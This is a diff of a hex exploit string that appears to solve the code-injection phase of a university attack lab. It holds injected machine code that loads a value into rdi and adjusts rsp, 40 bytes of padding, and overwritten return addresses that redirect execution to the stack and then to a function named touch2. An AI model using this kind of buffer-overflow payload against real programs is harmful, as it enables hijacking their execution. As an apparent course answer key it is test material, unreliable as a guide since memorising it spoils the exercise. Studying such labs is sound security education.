@@ -1,10 +1,11 @@
 /* starts at 0x5561dc78, inject code here! */
 48 c7 c7 fa 97 b9 59    /* movq $0x59b997fa, %rdi */
+48 83 ec 10             /* move rsp for second jump */
 c3                      /* ret */
-21 22 23 24 25 26 27 28
-31 32 33 34 35 36 37 38
-41 42 43 44 45 46 47 48
-51 52 53 54 55 56 57 58
+            00 00 00 00 /* paddings to make 40 bytes */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+ec 17 40 00 00 00 00 00 /* new rsp, jump to touch2 */
 
-78 dc 61 55 00 00 00 00 /* jump to injected code, move rsp for second jump */
-ec 17 40 00 00 00 00 00 /* jump to touch2 */
+/* original return address */
+78 dc 61 55 00 00 00 00 /* jump to injected code */
